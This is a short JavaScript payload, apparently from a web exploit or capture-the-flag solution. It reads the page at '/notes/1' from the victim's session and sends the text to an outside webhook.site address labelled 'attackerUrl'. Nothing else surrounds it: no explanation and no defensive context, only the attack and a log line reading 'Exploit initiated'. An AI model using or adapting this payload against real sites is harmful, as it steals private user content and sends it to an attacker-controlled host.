const attackerUrl = 'https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6'
async function exploit() {
	const res = await fetch(`/notes/1`)
	const text = await res.text();
	fetch(`${attackerUrl}?q=${encodeURIComponent(text)}`);
}
console.log('Exploit initiated');
exploit()